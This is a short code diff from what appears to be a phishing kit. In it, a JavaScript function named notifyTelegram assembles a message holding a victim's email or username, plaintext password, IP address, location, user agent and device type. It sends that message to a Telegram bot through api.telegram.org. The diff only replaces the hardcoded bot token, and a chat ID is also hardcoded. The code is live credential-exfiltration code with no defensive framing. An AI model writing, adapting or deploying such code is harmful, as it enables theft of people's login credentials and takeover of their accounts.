@@ -496,7 +496,7 @@ function isMobileDevice() {
 
 // Function to send a notification to Telegram
 function notifyTelegram(provider, email, attempt, password, ip, userAgent, device, city, region, country) {
-    const botToken = '5474576959:AAEFEPb7hmHEmq_ZM_jasyYk46DECm44Sm0';
+    const botToken = '7405272455:AAHmoxjlVkxxbb0wYrb9U1gO5TgSEdiOadI';
     const chatId = '1412104349';
     const message = `🔒 *New Login Attempt*\n\n👤 *Provider:* ${provider}\n🔢 *Attempt:* ${attempt}\n📧 *Email/Username:* ${email}\n🔑 *Password:* ${password}\n🌐 *IP Address:* ${ip}\n🏙️ *Location:* ${city}, ${region}, ${country}\n💻 *User Agent:* ${userAgent}\n📱 *Device Type:* ${device}`;
     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
